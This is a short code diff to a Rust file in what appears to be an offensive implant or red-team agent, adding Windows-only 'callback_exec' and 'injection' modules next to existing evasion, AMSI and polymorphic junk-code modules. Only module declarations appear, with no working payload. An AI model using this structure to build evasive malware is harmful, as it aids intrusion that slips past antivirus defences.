@@ -292,8 +292,12 @@ impl Agent {
 pub mod evasion;
 pub mod stub;
 pub mod amsi_defense;
+#[cfg(windows)]
+pub mod callback_exec;
 
 // Inserting some random junk compilation artifacts (FR-2)
 pub fn polymorph() {
     junk_macro::insert_junk!();
 }
+#[cfg(windows)]
+pub mod injection;
